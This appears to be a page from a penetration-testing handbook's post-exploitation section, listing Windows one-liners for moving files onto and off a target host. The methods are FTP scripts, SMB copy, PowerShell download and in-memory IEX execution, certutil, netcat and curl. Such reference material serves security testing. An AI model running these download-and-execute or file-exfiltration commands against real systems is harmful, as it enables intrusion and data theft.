# Windows

```bash
# FTP
echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
powershell "wget <URL>"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"

# CertUtil
certutil.exe -urlcache -split -f "<URL>"

# NETCAT
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>

# CURL
curl <URL> -o <OUT_FILE>
```

[PreviousReverse Shells](https://pentestbook.six2dez.com/exploitation/reverse-shells)[Next](https://pentestbook.six2dez.com/post-exploitation/linux)
